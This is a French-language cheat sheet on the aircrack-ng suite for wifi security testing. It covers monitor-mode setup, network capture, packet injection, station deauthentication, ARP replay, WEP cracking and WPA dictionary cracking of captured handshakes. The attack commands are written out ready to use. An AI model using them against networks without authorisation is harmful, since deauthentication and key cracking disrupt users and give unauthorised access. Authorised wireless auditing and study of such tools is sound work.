aircrack-ng
===========

*aircrack-ng* est une suite logicielle permettant de tester la sécurité des
réseaux sans-fil type 802.11 (wifi).

Un peu de vocabulaire :
* AP : Access Point
* STA : une station connectée à un AP
* essid : nom diffusé par l'AP.
* bssid : adresse MAC de l'AP

## Configuration

Pour voir les caractéristiques des interfaces wifi du système (on peut
connaître par exemple les modes possibles : `AP` ou `monitor` par
exemple) :
```
# iw list
```

ou
```
# iw phy phy0 info
```

Pour mettre l'interface `wlan0` en mode `monitor` :
```
# airmon-ng start wlan0
```

On peut fixer un canal d'écoute :
```
# airmon-ng start wlan0 9
```

Pour désactiver le mode `monitor` :
```
# airmon-ng stop wlan0mon
```

A noter que l'interface change de nom lorsqu'elle passe en mode
`monitor` : `wlan0` -> `wlan0mon`

Pour tuer les process qui pourraient gêner le changement de mode :
```
# airmon-ng check kill
```

## Utilisation

### Reconnaissance

Pour scanner les réseaux wifi disponibles :
```
# iwlist wlan0 scan
```

### Ecoute

Pour écouter (tous les réseaux) :
```
# airodump-ng wlan0mon
```

Pour spécifier en plus le *channel* et le *bssid* de l'AP cible et dumper la
capture (les fichiers générés auront le préfixe `dump`) :
```
# airodump-ng wlan0mon -c 9 --bssid XX:XX:XX:XX:XX:XX -w dump
```

### Injection de paquets

Pour tester une injection de paquets :
```
# aireplay-ng -9 -e <essid> -a <bssid> wlan0mon
```

Pour dés-authentifier une station (option `-0`) :
```
# aireplay-ng -0 <nombre_de_req_envoyées> -c <station_mac_addr> -a <bssid> wlan0mon
```

Pour rejouer du trafic (après qu'une station ait créé du trafic légitime) :
```
# aireplay-ng --arpreplay -b <bssid> -h <station_mac_addr> wlan0mon
```

### Crack clé WEP

Le principe ici est de capturer suffisamment de trafic (des *IVs*). On peut
rejouer des paquets si nécessaire pour générer plus de trafic.
```
# aircrack-ng *cap
```

### Crack clé WPA

Pour cracker une clé WPA avec un fichier de dictionnaire après avoir capturer
un *4-way-handshake*. On peut dés-authentifier une station si nécessaire pour
forcer sa ré-authentification.
```
# aircrack-ng -w dict.txt -b <bssid> dump.cap
```

On peut simplement lire le fichier de capture pour voir si des handshakes ont
été capturés :
```
# aircrack-ng <capture_file>
```

On peut ajouter l'option `-j` pour créer un fichier *HCCAPX* pour *hashcat* :
```
# aircrack-ng <capture_file> -j <hashcat_file_to_create>
```

Si on veut voir le handshake dans *Wireshark*, on peut appliquer ce filtre :
```
(wlan.fc.type_subtype == 0x08 || wlan.fc.type_subtype == 0x05 || eapol) && wlan.addr==XX:XX:XX:XX:XX:XX
```

## Sources

* <https://linuxconfig.org/discover-hidden-wifi-ssids-with-aircrack-ng>
* <https://www.aircrack-ng.org/doku.php?id=simple_wep_crack>
* <https://www.aircrack-ng.org/doku.php?id=newbie_guide>
* <https://doc.ubuntu-fr.org/aircrack-ng>
